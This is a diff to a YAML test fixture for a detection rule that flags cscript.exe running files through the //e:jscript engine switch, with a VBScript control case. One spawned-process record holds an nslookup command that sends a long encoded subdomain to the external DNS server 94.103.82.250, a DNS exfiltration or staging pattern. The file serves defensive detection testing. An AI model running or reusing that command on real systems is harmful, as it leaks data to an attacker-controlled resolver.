@@ -6,10 +6,9 @@ detection:
   id: 002f1e24-146e-11ec-a470-acde48001122
 description: |
   Validates detection of cscript.exe running a file as JScript through the
-  //e:jscript engine switch, which decides the language so the script can be
-  staged under any extension. Both of the rule's branches are covered: the
-  script host itself, and a process it spawned. The control runs the same
-  host with the VBScript engine.
+  //e:jscript engine switch, both as the host itself and as the parent of a
+  process it spawned. A control models the same host running the
+  file through the VBScript engine.
 
 mitre:
   tactics: [execution]
@@ -28,6 +27,7 @@ workloads:
       computer:            ref.computer
       engine_switch:       "//e:jscript"
       script_path:         ibivigi.txt
+      command_line:        "cscript  //e:jscript ibivigi.txt"
       current_directory:   'C:\Users\Public\'
       parent_image:        'C:\Windows\System32\cmd.exe'
       parent_command_line: '"C:\Windows\System32\cmd.exe" /c start /B cscript //e:jscript ibivigi.txt'
@@ -47,7 +47,7 @@ workloads:
       host_description:    Windows Command Processor
       host_product:        "Microsoft® Windows® Operating System"
       file_hash:           "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A"
-      command_line:        '"C:\Windows\system32\cmd.exe" /c nslookup.exe -timeout=5 -retry=3 -type=A staged.example.com 94.103.82.250'
+      command_line:        '"C:\Windows\system32\cmd.exe" /c nslookup.exe -timeout=5 -retry=3 -type=A fQlL9SOYBrm5CNMpVzkKtoHG_8cJPTh36*e0UEqyRunWFx4DvAX7jgsZ1bIwi2d.apZzbPOt2JqSx8K2ZcsEjTGz7TGTyhKgKVktgVUQ9rKQSrKo9rKolHE8OzqvENj.8yrKSlcXtvNXtvCltvNltvNetvCqFECLtECLfECLBECL_ECKNOzXtvMktvCltvN.lfo1.org 94.103.82.250 > C:\Users\ADMINI~1\AppData\Local\Temp\nlsvqc.tmp 2>&1'
       current_directory:   'C:\Users\Public\'
       parent_image:        'C:\Windows\System32\cscript.exe'
       parent_command_line: "cscript  //e:jscript ibivigi.txt"
@@ -63,6 +63,7 @@ workloads:
       computer:            ref.computer
       engine_switch:       "//e:vbscript"
       script_path:         ibivigi.txt
+      command_line:        "cscript  //e:vbscript ibivigi.txt"
       current_directory:   'C:\Users\Public\'
       parent_image:        'C:\Windows\System32\cmd.exe'
       parent_command_line: '"C:\Windows\System32\cmd.exe" /c start /B cscript //e:vbscript ibivigi.txt'
